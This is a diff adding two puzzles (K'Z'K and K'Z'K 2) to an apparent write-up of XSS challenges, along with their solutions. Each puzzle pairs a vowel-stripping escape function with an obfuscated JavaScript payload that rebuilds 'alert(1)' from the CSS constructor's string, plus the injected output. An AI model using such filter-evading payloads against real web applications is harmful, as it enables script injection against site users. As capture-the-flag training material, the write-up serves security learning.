@@ -13,6 +13,8 @@
 - [Well](#well)
 - [No](#no)
 - [K'Z'K](#kzk)
+- [K'Z'K 2](#kzk2)
+- [K'Z'K 3](#kzk3)
 
 ## Warmup
 
@@ -208,6 +210,61 @@ console.log(string);
 ```
 
 ## K'Z'K
+
+- The code below generates HTML in an unsafe way. Prove it by calling alert(1).
+
+
+```
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+- Solution
+
+```
+"+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"
+```
+
+- Output
+
+```
+<script>console.log(""+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"");</script>
+```
+
+## K'Z'K 2
+
+- The code below generates HTML in an unsafe way. Prove it by calling alert(1).
+
+
+```
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels and escape sequences in honor of K'Z'K 
+    // y is only sometimes a vowel, so it's only removed as a literal
+    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
+    // remove certain characters that can be used to get vowels
+    s = s.replace(/[{}!=<>]/g, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+- Solution
+
+```
+"+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"
+```
+
+- Output
+
+```
+<script>console.log(""+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"");</script>
+```
+
+## K'Z'K 3
 
 - The code below generates HTML in an unsafe way. Prove it by calling alert(1).
 
